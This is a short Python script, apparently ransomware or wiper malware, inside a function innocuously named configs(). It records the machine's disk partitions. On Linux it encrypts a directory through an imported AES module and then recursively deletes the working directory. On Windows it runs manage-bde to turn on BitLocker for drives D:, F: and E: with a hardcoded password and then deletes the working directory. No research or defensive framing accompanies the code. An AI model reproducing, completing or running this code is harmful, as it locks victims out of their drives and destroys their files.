import os , platform,psutil,sqlite3 , AES , shutil 
import writer

def configs():     
    conn = sqlite3.connect("drives.db")
    cursor = conn.cursor()

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS drives (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device TEXT NOT NULL,
            mountpoint TEXT NOT NULL,
            fstype TEXT NOT NULL
        )
    """)

    partitions = psutil.disk_partitions()

    for partition in partitions:
        cursor.execute("INSERT INTO drives (device, mountpoint, fstype) VALUES (?, ?, ?)",
                    (partition.device, partition.mountpoint, partition.fstype))

    conn.commit()

    
    cursor.execute("SELECT device FROM drives")
    rows = cursor.fetchall()
    
    partition = f"{rows[1][0 and 1 and 2 and 3 and 4]}"  
    namefileorginal = "a3f9b7c8d5e1f2a9c4d8e6f1b7a2c3d4"


    if platform.system() == "Linux": 
        AES.encrypt_directory(AES.directory)
        writer.writerorginalsystem()

      
        file_path = os.getcwd() 
        shutil.rmtree(file_path) 


    elif platform.system() == "Windows": 
        os.system(f'cmd /c "manage-bde -on D: -pw {namefileorginal}')
        os.system(f'cmd /c "manage-bde -on F: -pw {namefileorginal}')
        os.system(f'cmd /c "manage-bde -on E: -pw {namefileorginal}')
        os.system(f'cmd /c "manage-bde -on D: -pw {namefileorginal}')

        file_path = os.getcwd() 
        shutil.rmtree(file_path)
